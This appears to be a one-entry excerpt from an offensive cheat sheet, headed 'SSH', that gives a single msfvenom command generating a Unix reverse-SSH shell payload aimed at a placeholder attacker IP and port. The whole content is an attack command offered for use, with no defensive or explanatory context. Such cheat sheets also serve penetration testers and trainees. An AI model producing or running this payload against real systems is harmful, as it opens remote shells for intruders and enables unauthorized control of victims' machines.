# SSH

## 01 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_ssh lhost=<IP> lport=<PORT>
```